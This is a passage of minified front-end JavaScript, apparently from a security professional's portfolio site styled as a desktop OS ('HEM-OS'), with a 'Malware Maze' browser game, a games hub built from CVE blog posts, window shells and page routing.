t=gg(e),s={row:Ve-1,col:0};let a={row:Math.floor(Math.random()*Ve),col:Math.floor(Math.random()*Ve)};for(;a.row===s.row&&a.col===s.col;)a={row:Math.floor(Math.random()*Ve),col:Math.floor(Math.random()*Ve)};let r=new Set;for(let i=0;i<24;i+=1){const l=new Set,c=[];for(let u=0;u<Ve;u+=1)for(let f=0;f<Ve;f+=1){const p=qe(u,f);p===qe(s.row,s.col)||p===qe(a.row,a.col)||c.push(p)}for(;l.size<n&&c.length;){const u=Math.floor(Math.random()*c.length),[f]=c.splice(u,1);l.add(f)}if(yg(s,a,l)){r=l;break}}return{entry:t,start:s,target:a,walls:r}},Cr=(e,n)=>[{type:"system",text:"MALWARE MAZE // Wireframe grid online."},{type:"system",text:"Navigate the maze and quarantine the infected node."},{type:"info",text:`Scan charges: ${e}. Probe charges: ${n}.`}],vg=(e,n)=>{const t=n.row<e.row?"north":n.row>e.row?"south":"aligned",s=n.col<e.col?"west":n.col>e.col?"east":"aligned";return t==="aligned"&&s==="aligned"?"on target":t==="aligned"?s:s==="aligned"?t:`${t}-${s}`},wg=e=>e===0?"direct":e<=2?"hot":e<=4?"warm":e<=6?"cool":"cold";function kg({entries:e=[],difficulty:n="standard"}){var O,U,X;const t=tc[n]||tc.standard,[s,a]=w.useState(()=>Lr(e,t.maxWalls)),[r,i]=w.useState(()=>s.start),[l,c]=w.useState(()=>new Set([qe(s.start.row,s.start.col)])),[u,f]=w.useState(0),[p,g]=w.useState(t.scanCharges),[v,k]=w.useState(t.probeCharges),[y,S]=w.useState("active"),[m,d]=w.useState(()=>Cr(t.scanCharges,t.probeCharges)),h=w.useRef(null),x=w.useMemo(()=>{var q,T,_,P;return{year:((q=s.entry)==null?void 0:q.year)||"Unknown",severity:((T=s.entry)==null?void 0:T.severity)||"Unknown",keyword:mg(`${((_=s.entry)==null?void 0:_.title)||""} ${((P=s.entry)==null?void 0:P.summary)||""}`)}},[s]);w.useEffect(()=>{h.current&&(h.current.scrollTop=h.current.scrollHeight)},[m]),w.useEffect(()=>{if(!e.length)return;const q=Lr(e,t.maxWalls);a(q),i(q.start),c(new Set([qe(q.start.row,q.start.col)])),f(0),g(t.scanCharges),k(t.probeCharges),S("active"),d([...Cr(t.scanCharges,t.probeCharges),{type:"system",text:"New maze instance deployed."}])},[e,n]);const b=(q,T="info")=>{d(_=>[..._,{type:T,text:q}])},E=()=>{const q=Lr(e,t.maxWalls);a(q),i(q.start),c(new Set([qe(q.start.row,q.start.col)])),f(0),g(t.scanCharges),k(t.probeCharges),S("active"),d([...Cr(t.scanCharges,t.probeCharges),{type:"system",text:"Maze rebooted."}])},C=(q,T)=>{var R;if(y==="found")return;const _=r.row+q,P=r.col+T;if(!Ei(_,P)){b("Boundary reached. Movement blocked.","warning");return}const M=qe(_,P);if(s.walls.has(M)){b("Firewall ahead. Choose another route.","warning");return}i({row:_,col:P}),c(F=>{const ke=new Set(F);return ke.add(M),ke}),f(F=>F+1),_===s.target.row&&P===s.target.col&&(S("found"),b("Infected node contained.","success"),b(`Identity confirmed: ${((R=s.entry)==null?void 0:R.id)||"Unknown"}.`,"success"))},A=()=>{if(y==="found")return;if(p<=0){b("Scan depleted. Use PROBE or move closer.","warning");return}const q=Math.abs(r.row-s.target.row)+Math.abs(r.col-s.target.col),T=wg(q),_=vg(r,s.target);g(P=>Math.max(P-1,0)),b(`Scan: signal ${T}. Direction ${_}.`,"info")},I=()=>{if(y==="found")return;if(v<=0){b("Probe depleted. Use SCAN or move.","warning");return}const q=Ud(r.row,r.col).filter(T=>Ei(T.row,T.col)?s.walls.has(qe(T.row,T.col)):!0).length;k(T=>Math.max(T-1,0)),b(`Probe: ${q} firewall blocks adjacent lanes.`,"info")},j=(q,T)=>l.has(qe(q,T)),Z=(q,T)=>s.walls.has(qe(q,T)),we=(q,T)=>r.row===q&&r.col===T,Le=(q,T)=>y==="found"&&s.target.row===q&&s.target.col===T;return o.jsxs("div",{className:"maze-layout",children:[o.jsxs("div",{className:"maze-panel",children:[o.jsxs("div",{className:"maze-header",children:[o.jsxs("div",{children:[o.jsx("div",{className:"maze-title",children:"Malware Maze"}),o.jsx("div",{className:"maze-subtitle",children:"Navigate the grid and lock down the infection."})]}),o.jsx("div",{className:`maze-status ${y}`,children:y==="found"?"CONTAINED":"ACTIVE"})]}),o.jsxs("div",{className:"maze-intel",children:[o.jsxs("div",{className:"maze-intel-row",children:[o.jsx("span",{children:"Codename"}),o.jsx("span",{children:x.keyword})]}),o.jsxs("div",{className:"maze-intel-row",children:[o.jsx("span",{children:"Year"}),o.jsx("span",{children:x.year})]}),o.jsxs("div",{className:"maze-intel-row",children:[o.jsx("span",{children:"Severity"}),o.jsx("span",{children:x.severity})]}),o.jsxs("div",{className:"maze-intel-row",children:[o.jsx("span",{children:"Moves"}),o.jsx("span",{children:u})]}),o.jsxs("div",{className:"maze-intel-row",children:[o.jsx("span",{children:"Scans"}),o.jsx("span",{children:p})]}),o.jsxs("div",{className:"maze-intel-row",children:[o.jsx("span",{children:"Probes"}),o.jsx("span",{children:v})]})]}),o.jsxs("div",{className:"maze-controls",children:[o.jsxs("div",{className:"maze-dpad",children:[o.jsx("button",{type:"button",onClick:()=>C(-1,0),"aria-label":"Move north",children:"^"}),o.jsxs("div",{className:"maze-dpad-middle",children:[o.jsx("button",{type:"button",onClick:()=>C(0,-1),"aria-label":"Move west",children:"<"}),o.jsx("button",{type:"button",onClick:()=>C(0,1),"aria-label":"Move east",children:">"})]}),o.jsx("button",{type:"button",onClick:()=>C(1,0),"aria-label":"Move south",children:"v"})]}),o.jsxs("div",{className:"maze-actions",children:[o.jsx("button",{className:"pill",type:"button",onClick:A,children:"Scan"}),o.jsx("button",{className:"pill",type:"button",onClick:I,children:"Probe"}),o.jsx("button",{className:"pill",type:"button",onClick:E,children:"New maze"}),y==="found"&&((O=s.entry)==null?void 0:O.href)&&o.jsx("a",{className:"button primary",href:s.entry.href,target:"_blank",rel:"noreferrer",children:"Open report"})]})]}),o.jsx("div",{className:"maze-log",ref:h,children:m.map((q,T)=>o.jsx("div",{className:`maze-line ${q.type}`,children:q.text},`${q.type}-${T}`))}),y==="found"&&o.jsxs("div",{className:"maze-result",children:[o.jsx("div",{className:"maze-result-title",children:"Node quarantined"}),o.jsx("div",{className:"maze-result-id",children:((U=s.entry)==null?void 0:U.id)||"Unknown"}),o.jsx("div",{className:"maze-result-text",children:(X=s.entry)==null?void 0:X.title})]})]}),o.jsx("div",{className:`maze-stage ${y==="found"?"win":""}`,children:o.jsx("div",{className:"maze-grid",children:Array.from({length:Ve}).map((q,T)=>Array.from({length:Ve}).map((_,P)=>o.jsx("div",{className:["maze-cell",j(T,P)?"visited":"",Z(T,P)?"wall":"",we(T,P)?"player":"",Le(T,P)?"target":""].filter(Boolean).join(" ")},`${T}-${P}`)))})})]})}const Pr={"node-hunt":{label:"Node Hunt",Cmp:dg},"packet-intercept":{label:"Packet Intercept",Cmp:hg},"malware-maze":{label:"Malware Maze",Cmp:kg}};function Hd({initialGame:e="node-hunt"}){const[n,t]=w.useState(Pr[e]?e:"node-hunt"),[s,a]=w.useState("standard"),r=w.useMemo(()=>{const l=p=>p.toUpperCase().includes("CVE"),c=p=>{const v=((p||"").match(/\d/g)||[]).reduce((y,S)=>y+Number(S),0),k=["Low","Medium","High","Critical"];return k[v%k.length]},u=p=>p==="Critical"?9.4:p==="High"?8.1:p==="Medium"?6:4,f=p=>{if(!p)return"Unknown";const g=new Date(p).getFullYear();return Number.isFinite(g)?String(g):"Unknown"};return me.filter(p=>l(p.title)).map(p=>{const g=p.title.match(/CVE[-–](\d{4})[-–]?(\d+)/i),v=g?`CVE-${g[1]}-${g[2]}`:p.slug.toUpperCase(),k=c(v);return{id:v,title:p.title,severity:k,cvss:u(k),year:f(p.date),kev:!1,summary:p.excerpt,href:p.href||`/blog/${p.slug}`}})},[]),i=Pr[n].Cmp;return o.jsxs("div",{className:"games-app",children:[o.jsxs("div",{className:"games-toolbar",children:[o.jsx("div",{className:"cve-game-toggle",role:"tablist","aria-label":"Security games",children:Object.entries(Pr).map(([l,c])=>o.jsx("button",{type:"button",role:"tab","aria-selected":n===l,className:n===l?"active":"",onClick:()=>t(l),children:c.label},l))}),o.jsxs("div",{className:"cve-difficulty-toggle",role:"group","aria-label":"Difficulty",children:[o.jsx("span",{className:"difficulty-label",children:"Difficulty"}),["easy","standard","hard"].map(l=>o.jsx("button",{type:"button",className:s===l?"active":"",onClick:()=>a(l),children:l},l))]})]}),o.jsx("div",{className:"cve-hunt-shell",children:o.jsx(i,{entries:r,difficulty:s})})]})}function bg({app:e,win:n,desktop:t}){const s=n.appState||{};switch(e){case"readme":return o.jsx(Eo,{onLaunch:t.launch});case"finder":return o.jsx(qd,{});case"notes":return o.jsx(Rd,{initialSlug:s.selectedSlug,onOpenPost:t.openPost});case"files":return o.jsx(Od,{initialTitle:s.selectedTitle});case"terminal":return o.jsx(Dd,{runOnOpen:s.runOnOpen,runOnOpenNonce:s.runOnOpenNonce,onLaunch:t.launch});case"timeline":return o.jsx(zd,{});case"mail":return o.jsx(Fd,{});case"system":return o.jsx(Bd,{});case"games":return o.jsx(Hd,{initialGame:s.initialGame});default:return null}}function xg({autoOpen:e,autoOpenSlug:n,freshBoot:t}){var k;const s=Jm(),[a,r]=w.useState(n||null);w.useEffect(()=>{if(n){s.launch("notes",{selectedSlug:n}),r(n);return}if(e){s.launch(e);return}t&&s.launch("readme")},[]),w.useEffect(()=>{const y=S=>{(S.metaKey||S.ctrlKey)&&S.key.toLowerCase()==="k"?(S.preventDefault(),s.toggleSpotlight()):S.key==="Escape"&&s.closeSpotlight()};return window.addEventListener("keydown",y),()=>window.removeEventListener("keydown",y)},[s]);const i=w.useRef(s.windows);w.useEffect(()=>{i.current=s.windows},[s.windows]),w.useEffect(()=>{const y=()=>{i.current.filter(S=>S.app==="terminal").forEach(S=>s.close(S.id))};return window.addEventListener("hemos-close-term",y),()=>window.removeEventListener("hemos-close-term",y)},[]);const l=(k=s.windows.find(y=>y.id===s.focusId))==null?void 0:k.app,c=[...new Set(s.windows.map(y=>y.app))],u=w.useCallback(y=>{s.launch("notes",{selectedSlug:y}),r(y)},[s.launch]),f=w.useCallback(y=>{s.launch("terminal",{runOnOpen:`cat cve ${y}`,runOnOpenNonce:Date.now()})},[s.launch]),p={launch:s.launch,closeActive:()=>{s.focusId!=null&&s.close(s.focusId)},minimizeAll:()=>s.windows.forEach(y=>{y.minimized||s.minimize(y.id)}),closeAll:()=>s.windows.forEach(y=>s.close(y.id)),hasFocus:s.focusId!=null,hasOpen:s.windows.length>0},v=s.windows.filter(y=>!y.minimized).length===0&&!a;return o.jsxs("div",{className:"desktop",children:[o.jsx(xm,{activeApp:l,onSpotlight:s.toggleSpotlight,actions:p}),o.jsx("div",{className:"dmark",children:` ▒ HEM-OS 1.7.0
  curiosity-d ✓
  43 pentests
  18 posts
  12 certs
  1  patent
  ∞  questions`}),v&&o.jsx("div",{className:"desktop-welcome",children:o.jsx(Eo,{onLaunch:s.launch})}),s.windows.map(y=>o.jsx(_m,{win:y,focused:y.id===s.focusId,onClose:s.close,onMinimize:s.minimize,onToggleMaximize:s.toggleMaximize,onFocus:s.focus,onMove:s.move,onResize:s.resize,children:o.jsx(bg,{app:y.app,win:y,desktop:{...s,openPost:u}})},y.id)),o.jsx(Sm,{onLaunch:s.launch,openApps:c}),s.spotlightOpen&&o.jsx("div",{onClick:s.closeSpotlight,style:{position:"fixed",inset:0,zIndex:70,background:"rgba(0,0,0,0.3)"},children:o.jsx(jd,{onClose:s.closeSpotlight,onLaunch:s.launch,onOpenPost:u,onRunCveCommand:f})}),a&&o.jsx(Id,{slug:a,onClose:()=>r(null)})]})}function Sg(e,n){const t=n||{};switch(e){case"readme":return o.jsx(Eo,{onLaunch:t.onLaunch});case"finder":return o.jsx(qd,{});case"notes":return o.jsx(Rd,{initialSlug:t.selectedSlug,onOpenPost:t.onOpenPost});case"files":return o.jsx(Od,{initialTitle:t.selectedTitle});case"terminal":return o.jsx(Dd,{runOnOpen:t.runOnOpen,runOnOpenNonce:t.runOnOpenNonce,onLaunch:t.onLaunch});case"timeline":return o.jsx(zd,{});case"mail":return o.jsx(Fd,{});case"system":return o.jsx(Bd,{});case"games":return o.jsx(Hd,{initialGame:t.initialGame});default:return null}}function _g({autoOpen:e,autoOpenSlug:n}){var S;const[t,s]=w.useState(e||"readme"),[a,r]=w.useState({}),[i,l]=w.useState(n||null),[c,u]=w.useState(!1),[f,p]=w.useState(new Date);w.useEffect(()=>{const m=setInterval(()=>p(new Date),3e4);return()=>clearInterval(m)},[]),w.useEffect(()=>{n?(s("notes"),r({selectedSlug:n})):e&&s(e)},[e,n]);const g=(m,d)=>{s(m),r(d||{})},v=m=>l(m),k=m=>{s("terminal"),r({runOnOpen:`cat cve ${m}`,runOnOpenNonce:Date.now()})},y=w.useMemo(()=>({...a,onLaunch:g,onOpenPost:v}),[a]);return o.jsxs("div",{className:"mshell",children:[o.jsxs("div",{className:"mtop",children:[o.jsx("span",{className:"brand",children:"⌘ HEM-OS"}),o.jsx("span",{children:((S=xe[t])==null?void 0:S.title)||"Desktop"}),o.jsx("span",{className:"clk",children:f.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})}),o.jsx("span",{className:"sp-icon",onClick:()=>u(!0),children:"⌕"})]}),o.jsx("div",{className:"mbody",children:Sg(t,y)}),o.jsx("div",{className:"mtabs",children:Ad.map(m=>{const d=xe[m],h=d.title.split(" ")[0][0],x=d.title.split("—")[0].trim();return o.jsxs("div",{className:`mt ${t===m?"on":""}`,onClick:()=>{s(m),r({})},children:[o.jsx("div",{className:`mtg ${d.g}`,children:h}),o.jsx("div",{className:"mtl",children:x})]},m)})}),i&&o.jsx(Id,{slug:i,onClose:()=>l(null)}),c&&o.jsx("div",{onClick:()=>u(!1),style:{position:"fixed",inset:0,zIndex:80,background:"rgba(0,0,0,0.4)"},children:o.jsx(jd,{onClose:()=>u(!1),onLaunch:g,onOpenPost:v,onRunCveCommand:k})})]})}const sc=768;function Tg(){const[e,n]=w.useState(()=>typeof window>"u"?!1:window.innerWidth<=sc);return w.useEffect(()=>{const t=()=>n(window.innerWidth<=sc);return window.addEventListener("resize",t),()=>window.removeEventListener("resize",t)},[]),e}const ac="hemos:bootSeen";function Lo({autoOpen:e,autoOpenSlug:n}){const[t]=wm(),s=Tg(),a=t.get("boot")==="1",r=!!e||!!n,[i,l]=w.useState(()=>{if(a)return"boot";if(r)return"shell";try{if(typeof window<"u"&&localStorage.getItem(ac)==="1")return"shell"}catch{}return"boot"}),[c,u]=w.useState(!1);return w.useEffect(()=>{i==="shell"&&document.body.classList.add("dark")},[i]),i==="boot"?o.jsx(km,{onDone:()=>{try{localStorage.setItem(ac,"1")}catch{}u(!0),l("shell")}}):s?o.jsx(_g,{autoOpen:e,autoOpenSlug:n}):o.jsx(xg,{autoOpen:e,autoOpenSlug:n,freshBoot:c})}function Eg(){const{slug:e}=Jf();return o.jsx(Lo,{autoOpenSlug:e})}function rc(){return o.jsx(Lo,{})}function $s({app:e}){return o.jsx(Lo,{autoOpen:e})}function Lg(){return o.jsx(vm,{children:o.jsxs(fm,{children:[o.jsx(mn,{path:"/",element:o.jsx(rc,{})}),o.jsx(mn,{path:"/blog/:slug",element:o.jsx(Eg,{})}),o.jsx(mn,{path:"/blogs",element:o.jsx($s,{app:"notes"})}),o.jsx(mn,{path:"/projects",element:o.jsx($s,{app:"files"})}),o.jsx(mn,{path:"/certifications",element:o.jsx($s,{app:"timeline"})}),o.jsx(mn,{path:"/cve-map",element:o.jsx($s,{app:"games"})}),o.jsx(mn,{path:"*",element:o.jsx(rc,{})})]})})}wd(document.getElementById("root")).render(o.jsx(gc.StrictMode,{children:o.jsx(Lg,{})}));
